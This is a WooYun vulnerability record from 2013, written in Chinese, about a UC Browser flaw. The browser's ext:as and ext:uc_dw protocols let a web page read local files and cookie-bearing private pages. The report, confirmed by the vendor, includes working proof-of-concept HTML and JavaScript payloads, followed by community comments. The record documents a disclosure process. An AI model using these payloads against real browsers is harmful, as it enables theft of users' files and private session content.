{"id": 5372, "wybug_id": "wooyun-2013-046757", "wybug_title": "UC浏览器窃取本地文件和任意http域内容", "wybug_corp": "UC Mobile", "wybug_author": "爱梅小礼", "wybug_date": "2013-12-23 10:21", "wybug_open_date": "2014-03-23 10:22", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["跨域"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-23：\t细节向公众公开  简要描述： 这次带来了两个弱点，一个是跨本地域，另一个是本地域可以执行的new payload。（感谢wooyun和厂商给的price，本想留着些漏洞等过年以后再提交呢，为了表达谢意，我也不能老是留着） 详细说明：  测试版本：9.4.2.365本次问题是ext:as协议引起的http->file的跨域：\n<iframe src=ext:as:navi_online_index-479*1248-U90888:file:///mnt/sdcard/payload.html></iframe>\n它能做什么完全取决于file域的权限了，例如可以窃取本地文件。可参考  WooYun: UC浏览器跨本地域漏洞可获取本地文件内容  中的exp和payload代码，经测试也是可以的，几乎可以复制，此处不再赘述。而今天我要发的payload是file->http跨域弱点，自从  WooYun: UC浏览器跨本地域XSS可盗取任意域Cookie  之后，UC修补了这个弱点，file域再也无法获取到http域的任何内容（document.getElementById.contentDocument不再能获取到远程iframe的句柄），但这种限制可以间接绕过：UC内置协议ext:uc_dw可以无提示地下载任意类型的文件，而且request是带着相应cookie的，并保存在固定目录，下载文件名也是可预测的。所以思路就是使用ext:uc_dw把想要读取的内容下载到本地，然后再读取本地文件（file域读取file域没有限制）。   漏洞证明：  http协议远程访问exp.html 先将payload.html下载到本地，五秒钟等待下载完毕 再用ext:as跨域去执行它。exp.html内容：\n<html><body><iframe src=ext:uc_dw:http://127.0.0.1:8888/payload.html></iframe></body><script>setTimeout(\"document.body.innerHTML='<iframe src=ext:as:navi_online_index-479*1248-U90888:file:///mnt/sdcard/payload.html></iframe>'\",5000);</script></html>\n假设http://m.baidu.com/是用户只有登录过才能看到的持有cookie的私有页面，为保证这一点，我用自己的id登录了百度（右上角的id）：\n\npayload.html是exp.html下载到本地执行的，它先下载http://m.baidu.com/内容并自动保存到/mnt/sdcard/UCDownloads/index.html，然后再读取它：\n<html><body><iframe src=ext:uc_dw:http://m.baidu.com/></iframe></body><script>function inject(){var d = document.getElementById(\"hi\").contentDocument || document.getElementById(\"hi\").contentWindow.documentalert(d.body.innerHTML);}setTimeout(\"document.body.innerHTML='<iframe id=hi src=file:///mnt/sdcard/UCDownloads/index.html onload=inject()></iframe>'\",5000);</script></html>\n执行效果如下：exp.html会先下载payload.html\n\n五秒后payload.html会再下载http://m.baidu.com/内容并命名为index.html文件：\n\npayload.html读取index.html，从页面中的ID来看，确实是用户登录后的私有页面，而不是人人都能看到的前台页面：\n\n证明完毕，才发现我书面表达能力太差了。   修复方案：  哥，你懂   版权声明：转载请注明来源 爱梅小礼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-23 11:44 厂商回复： 经验证，漏洞存在，非常感谢爱梅小礼提供的漏洞信息！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-23 19:32 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  大侠的漏洞要收藏下 很不错    \n     2013-12-23 20:32 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @xsser 太过奖了，您这是给我折寿啊    \n     2013-12-23 21:01 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  洞主这么吊你家里知道吗？    \n     2013-12-24 11:36 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @爱梅小礼 希望下次可以参与俺们的众测哈    \n     2013-12-24 11:44 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @xsser 好的啊，我也一直想，不过腾不出太连续的时间    \n     2013-12-24 11:50 |    \t\t雷疯 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:4        | 喝酒 泡妞)\t\t \n  @爱梅小礼  膜拜师傅 好牛逼的洞    \n     2013-12-30 09:29 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @爱梅小礼 求拜师～～    \n     2013-12-30 10:33 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @D＆G 收女不收男，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}